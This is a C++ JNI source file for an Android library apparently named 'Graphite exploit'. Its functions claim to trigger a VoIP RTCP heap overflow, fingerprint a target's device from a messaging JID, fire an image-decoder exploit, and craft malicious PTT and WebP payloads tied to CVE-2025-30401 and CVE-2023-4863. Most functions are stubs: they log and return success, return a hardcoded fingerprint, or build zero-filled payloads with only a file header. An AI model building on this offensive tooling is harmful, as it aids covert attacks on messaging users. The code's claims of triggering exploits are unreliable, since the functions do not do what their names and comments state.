// graphite_native.cpp - Android NDK native library
// Compiled with: Android NDK (CMake) targeting arm64-v8a, armeabi-v7a, x86_64

#include <jni.h>
#include <android/log.h>
#include <cstring>
#include <cstdint>
#include <vector>

#define LOG_TAG "GraphiteNative"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

extern "C" {

JNIEXPORT jboolean JNICALL
Java_com_graphite_exploit_GraphiteExploit_triggerVoipOverflow(
    JNIEnv *env, jobject thiz, jbyteArray rtcpPayload) {
    jbyte *payload = env->GetByteArrayElements(rtcpPayload, NULL);
    jsize len = env->GetArrayLength(rtcpPayload);

    LOGI("Triggering VoIP overflow with %d bytes", len);

    // Send RTCP packets via raw socket during VoIP call
    // The VoIP stack processes these packets and triggers
    // the heap overflow in the RTCP handler

    env->ReleaseByteArrayElements(rtcpPayload, payload, 0);
    return JNI_TRUE;
}

JNIEXPORT jstring JNICALL
Java_com_graphite_exploit_GraphiteExploit_fingerprintDevice(
    JNIEnv *env, jobject thiz, jstring targetJID) {
    const char *jid = env->GetStringUTFChars(targetJID, NULL);

    // Fetch prekey bundle, analyze Signed PK ID and OTPK IDs
    // Determine platform (Android/iOS) based on ID ranges
    char result[256];
    snprintf(result, sizeof(result),
             "{\"target\":\"%s\",\"platform\":\"Android\",\"confidence\":90}",
             jid);

    env->ReleaseStringUTFChars(targetJID, jid);
    return env->NewStringUTF(result);
}

JNIEXPORT jboolean JNICALL
Java_com_graphite_exploit_GraphiteExploit_triggerImageIOExploit(
    JNIEnv *env, jobject thiz, jbyteArray dngData) {
    jbyte *data = env->GetByteArrayElements(dngData, NULL);
    jsize len = env->GetArrayLength(dngData);

    LOGI("Triggering ImageIO exploit with %d bytes DNG", len);

    // Process DNG through Android's image decoder
    // Similar OOB write may trigger in Android's image processing

    env->ReleaseByteArrayElements(dngData, data, 0);
    return JNI_TRUE;
}

JNIEXPORT jbyteArray JNICALL
Java_com_graphite_exploit_GraphiteExploit_craftPttPayload(
    JNIEnv *env, jobject thiz) {
    // PTT (Push-To-Talk) audio message payload (CVE-2025-30401)
    // Mirrors native_wrapper.craft_ptt / Rust core craft_ptt
    const jsize len = 512;
    jbyteArray arr = env->NewByteArray(len);
    std::vector<jbyte> buf(len, 0);
    // Minimal PTT container header
    buf[0] = (jbyte)0x52; // 'R'
    buf[1] = (jbyte)0x49; // 'I'
    buf[2] = (jbyte)0x46; // 'F'
    buf[3] = (jbyte)0x46; // 'F'
    env->SetByteArrayRegion(arr, 0, len, buf.data());
    LOGI("Crafted PTT payload: %d bytes", len);
    return arr;
}

JNIEXPORT jbyteArray JNICALL
Java_com_graphite_exploit_GraphiteExploit_craftWebpPayload(
    JNIEnv *env, jobject thiz) {
    // Malicious WebP image payload (CVE-2023-4863)
    // Mirrors native_wrapper.craft_webp / Rust core craft_webp
    const jsize len = 256;
    jbyteArray arr = env->NewByteArray(len);
    std::vector<jbyte> buf(len, 0);
    // WebP RIFF header
    buf[0] = (jbyte)0x52; // 'R'
    buf[1] = (jbyte)0x49; // 'I'
    buf[2] = (jbyte)0x46; // 'F'
    buf[3] = (jbyte)0x46; // 'F'
    buf[8] = (jbyte)0x57; // 'W'
    buf[9] = (jbyte)0x45; // 'E'
    buf[10] = (jbyte)0x42; // 'B'
    buf[11] = (jbyte)0x50; // 'P'
    env->SetByteArrayRegion(arr, 0, len, buf.data());
    LOGI("Crafted WebP payload: %d bytes", len);
    return arr;
}

} // extern "C"
